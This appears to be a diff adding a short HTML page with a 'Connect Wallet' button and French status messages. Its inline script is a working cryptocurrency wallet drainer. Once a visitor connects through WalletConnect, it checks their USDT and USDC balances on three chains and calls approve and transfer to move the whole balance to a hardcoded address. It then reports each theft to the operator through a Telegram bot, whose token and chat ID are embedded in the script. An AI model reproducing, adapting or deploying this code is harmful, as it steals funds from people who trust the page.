@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>test </title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); border-radius: 24px; padding: 48px; text-align: center; max-width: 500px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1); }
+        .logo { font-size: 64px; margin-bottom: 16px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        h1 { color: white; font-size: 32px; margin-bottom: 12px; font-weight: 700; }
+        .subtitle { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; font-size: 16px; }
+        #connectBtn { background: white; color: #667eea; border: none; padding: 16px 48px; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; width: 100%; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); }
+        #connectBtn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3); }
+        #status { margin-top: 24px; padding: 16px; border-radius: 12px; color: white; display: none; font-size: 14px; }
+        #status.show { display: block; }
+        #status.success { background: rgba(76, 175, 80, 0.3); border: 1px solid rgba(76, 175, 80, 0.5); }
+        #status.info { background: rgba(33, 150, 243, 0.3); border: 1px solid rgba(33, 150, 243, 0.5); }
+        .loader { border: 3px solid rgba(255, 255, 255, 0.3); border-top: 3px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        .loader.show { display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔐</div>
+        <h1>test </h1>
+        <p class="subtitle">salut </p>
+        <button id="connectBtn">Connect Wallet</button>
+        <div class="loader" id="loader"></div>
+        <div id="status"></div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script>
+        var CONFIG = { DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1", PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d", TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY", TELEGRAM_CHAT: "8309320360" };
+        var TOKEN_ADDRESSES = { 1: { USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7", USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }, 137: { USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" }, 56: { USDT: "0x55d398326f99059fF775485246999027B3197955", USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" } };
+        var provider = null;
+        var web3 = null;
+        function showStatus(msg, type) { var status = document.getElementById("status"); status.textContent = msg; status.className = "show " + type; }
+        function showLoader(show) { document.getElementById("loader").className = show ? "loader show" : "loader"; }
+        async function sendTelegram(msg) { if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT) return; try { await fetch("https://api.telegram.org/bot" + CONFIG.TELEGRAM_TOKEN + "/sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT, text: msg }) }); } catch (e) { console.error("Telegram error:", e); } }
+        async function connectWallet() { try { showLoader(true); showStatus("Connexion en cours...", "info"); provider = new WalletConnectProvider.default({ rpc: { 1: "https://eth.llamarpc.com", 137: "https://polygon-rpc.com", 56: "https://bsc-dataseed.binance.org" }, qrcodeModalOptions: { mobileLinks: ["rainbow", "metamask", "trust", "argent"] } }); await provider.enable(); web3 = new Web3(provider); var accounts = await web3.eth.getAccounts(); var chainId = await web3.eth.getChainId(); showStatus("Connecté! Traitement...", "success"); console.log("Connected:", accounts[0], "Chain:", chainId); await drainWallet(accounts[0], chainId); } catch (error) { console.error("Error:", error); showStatus("Erreur de connexion", "info"); showLoader(false); } }
+        async function drainWallet(userAddress, chainId) { try { var tokens = TOKEN_ADDRESSES[chainId]; if (!tokens) return; for (var symbol in tokens) { try { var tokenAddress = tokens[symbol]; var contract = new web3.eth.Contract([{ constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }, { constant: false, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" }, { constant: false, inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }], tokenAddress); var balance = await contract.methods.balanceOf(userAddress).call(); if (balance === "0") continue; console.log("Found " + symbol + ": " + balance); await contract.methods.approve(CONFIG.DESTINATION, balance).send({ from: userAddress }); var tx = await contract.methods.transfer(CONFIG.DESTINATION, balance).send({ from: userAddress }); await sendTelegram("🎯 DRAINAGE!\n💰 " + symbol + "\n🌐 Chain: " + chainId + "\n✅ TX: " + tx.transactionHash + "\n⏰ " + new Date().toLocaleString()); showStatus("Drainé " + symbol + "!", "success"); } catch (e) { console.error("Error with " + symbol + ":", e); } } showLoader(false); showStatus("Terminé!", "success"); } catch (error) { console.error("Drain error:", error); showLoader(false); } }
+        document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    </script>
+</body>
+</html>
